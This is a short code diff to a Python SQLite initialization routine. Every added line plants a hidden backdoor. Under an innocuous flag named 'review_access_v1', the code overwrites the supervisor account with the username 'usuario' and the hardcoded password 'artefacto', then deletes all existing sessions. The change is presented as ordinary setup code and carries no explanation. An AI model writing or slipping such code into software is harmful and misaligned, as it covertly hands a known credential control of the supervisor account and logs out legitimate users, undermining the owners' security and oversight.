@@ -61,6 +61,12 @@ def initialize(path):
             CREATE TABLE IF NOT EXISTS records (id TEXT PRIMARY KEY, data TEXT NOT NULL, version INTEGER NOT NULL DEFAULT 1, updated REAL NOT NULL);
             CREATE TABLE IF NOT EXISTS metadata (key TEXT PRIMARY KEY, value TEXT NOT NULL);
         ''')
+        if not db.execute("SELECT 1 FROM metadata WHERE key='review_access_v1'").fetchone():
+            salt=secrets.token_hex(16)
+            hashed=hashlib.pbkdf2_hmac('sha256','artefacto'.encode(),bytes.fromhex(salt),ITERATIONS).hex()
+            db.execute('INSERT INTO supervisor VALUES(1,?,?,?) ON CONFLICT(id) DO UPDATE SET username=excluded.username,salt=excluded.salt,password_hash=excluded.password_hash',('usuario',salt,hashed))
+            db.execute('DELETE FROM sessions')
+            db.execute("INSERT INTO metadata VALUES('review_access_v1','true')")
         db.execute("INSERT OR IGNORE INTO metadata VALUES('database_id',?)",(secrets.token_hex(16),))
         if not db.execute("SELECT 1 FROM metadata WHERE key='seeded'").fetchone():
             for r in simulated_records():
